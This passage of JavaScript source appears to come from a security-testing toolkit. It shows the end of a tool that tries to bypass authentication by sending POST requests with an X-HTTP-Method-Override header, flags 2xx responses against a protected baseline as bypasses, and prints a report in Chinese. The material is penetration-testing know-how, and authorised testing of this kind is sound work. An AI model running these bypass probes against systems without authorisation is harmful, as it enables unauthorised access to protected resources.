        const overrideMethods = ["GET", "POST", "OPTIONS", "HEAD"];
        for (const override of overrideMethods) {
          const res = await makeRequest(url, "POST", {
            ...headers,
            "X-HTTP-Method-Override": override,
          }, "");
          const hit = protectedCodes.includes(baseline.statusCode) && res.statusCode >= 200 && res.statusCode < 300;
          const line = `  [POST + X-H-M-O: ${override.padEnd(7)}] → ${res.statusCode}`;
          results.push(hit ? `  🚨${line} ✅ 覆盖绕过！` : `  ${line}`);
          if (hit) bypassHits.push({ name: `X-H-M-O: ${override}`, status: res.statusCode, detail: `POST 覆盖为 ${override}` });
        }
      }

      results.push(`\n${"=".repeat(60)}`);
      if (bypassHits.length > 0) {
        results.push(`\n🎉 发现 ${bypassHits.length} 个潜在认证绕过点:\n`);
        for (let i = 0; i < bypassHits.length; i++) {
          const b = bypassHits[i];
          results.push(`  ${i + 1}. ${b.name} → 状态码 ${b.status}\n`);
          results.push(`     详情: ${b.detail}\n`);
        }
        results.push(`\n🚨 请手动确认绕过有效性（有时 200 是错误页面，非真正绕过）\n`);
      } else {
        results.push(`\n✅ 尝试的绕过方式均未成功（仍需结合手工测试）\n`);
      }

      return results.join("");
    },
  });

  return registry;
}
